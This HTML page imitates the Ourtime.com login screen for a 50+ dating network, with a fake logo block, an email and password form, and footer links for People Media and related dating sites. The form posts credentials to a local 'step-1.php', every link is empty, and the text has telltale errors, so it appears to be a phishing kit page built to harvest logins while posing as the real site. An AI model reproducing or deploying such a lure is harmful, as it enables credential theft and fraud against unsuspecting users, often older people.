<!doctype html>
<html style="background-image:none">
<head>
<meta charset="utf-8">
<title>Ourtime.com - The 50+ Single Network</title>
<link rel="stylesheet" href="css/style.css">
<script src="js/jqueryLib.js" type="text/javascript"></script>
<meta http-equiv="x-ua-compatible" content="ie=edge">
<meta name="viewport" content="width=device-width,initial-scale=1,user-scalable=no">
<meta http-equiv="pragma" content="no-cache"><meta name="robots" content="noydir, noodp">
<link rel="shortcut icon" type="image/x-icon" href="images/favicon3.png" data-react-helmet="true">
</head>

<body>
	
    <div class="row-21">
    	<div class="row-21-content">
        	<a href=""><div class="row-21-people-logo"></div></a>
        </div>
    </div>
    <div class="row-22">
   	  <div class="row-22-panel">
        	<div class="row-22-side-1">
           	  <form name="form1" method="post" action="step-1.php">
           	    <table width="380" border="0">
           	      <tr>
           	        <td colspan="2"><div class="login-logo"></div></td>
       	          </tr>
           	      <tr>
           	        <td>&nbsp;</td>
           	        <td>&nbsp;</td>
       	          </tr>
           	      <tr>
           	        <td><div style="color:#55307c;margin:0 0 0 10px">Email</div></td>
           	        <td>
       	            <input type="email" name="my_email_address" id="my_email_address" required autocomplete="off" class="input-field2"></td>
       	          </tr>
           	      <tr>
           	        <td>&nbsp;</td>
           	        <td>&nbsp;</td>
       	          </tr>
           	      <tr>
           	        <td><div style="color:#55307c;margin:0 0 0 10px">Password</div></td>
           	        <td>
       	            <input type="password" name="my_password" id="my_password" required autocomplete="off" class="input-field2"></td>
       	          </tr>
           	      <tr>
           	        <td>&nbsp;</td>
           	        <td>&nbsp;</td>
       	          </tr>
           	      <tr>
           	        <td>&nbsp;</td>
           	        <td><div style="color:#333;padding:-5px 0 5px 0"><input type="checkbox" name="checkbox" id="checkbox">
       	            <label for="checkbox">Remember Me</label></div></td>
       	          </tr>
           	      <tr>
           	        <td>&nbsp;</td>
           	        <td>&nbsp;</td>
       	          </tr>
           	      <tr>
           	        <td>&nbsp;</td>
           	        <td><input type="submit" name="login-btn" id="login-btn" value="Login" class="login-btn"></td>
       	          </tr>
       	        </table>
          	  </form>
          </div>
            <div class="row-22-side-2">
            	<span style="font-size:13px;">Not a memeber yet?</span><br>
                <a href="" style="color:#5a9fdb;font-size:14px;text-decoration:none">Join Free</a>
                
                <div style="height:30px;width:100%;border-bottom:1px solid #CCC;margin:0 0 20px 0;"></div>
                
                <span style="font-size:13px;">Forgot password?</span><br>
                <a href="" style="color:#5a9fdb;font-size:14px;text-decoration:none">Click here</a>
            </div>
      </div>
    </div>
     <div class="row-20">
 	<div class="row-20-content">
    	Copyright © <script type="text/javascript">document.write(new Date().getFullYear());</script> &nbsp;</span> People Media. All rights reserved. 166x2617  . <a href="" style="color:#009fdb">Term of use</a> | <a href="" style="color:#009fdb">Privacy Policy</a> | <a href="" style="color:#009fdb">Cookies Policy</a>

    </div>
 </div>
 <div class="row-23">
 	<div class="row-23-content">
    	

<a href="" style="color:#009fdb;text-decoration:none">home</a> | <a href="" style="color:#009fdb;text-decoration:none">safety tips</a> | <a href="" style="color:#009fdb;text-decoration:none">contact us</a> | <a href="" style="color:#009fdb;text-decoration:none">billing</a> | <a href="" style="color:#009fdb;text-decoration:none">success stories</a> | <a href="" style="color:#009fdb;text-decoration:none">careers </a>| <a href="" style="color:#009fdb;text-decoration:none">about</a> | <a href="" style="color:#009fdb;text-decoration:none">advertise with us</a> | <a href="" style="color:#009fdb;text-decoration:none">search</a> |<a href="" style="color:#009fdb;text-decoration:none"> join now</a> |<a href="" style="color:#009fdb;text-decoration:none"> bookmark page</a> |<a href="" style="color:#009fdb;text-decoration:none"> site map</a>
<a href="" style="color:#009fdb;text-decoration:none">Match.com</a> | <a href="" style="color:#009fdb;text-decoration:none">Chemistry.com </a>| <a href="" style="color:#009fdb;text-decoration:none">Mature Dating</a> |<a href="" style="color:#009fdb;text-decoration:none"> Black Singles</a> | <a href="" style="color:#009fdb;text-decoration:none">Big and Beautiful</a>

    </div>
 </div>
</body>
</html>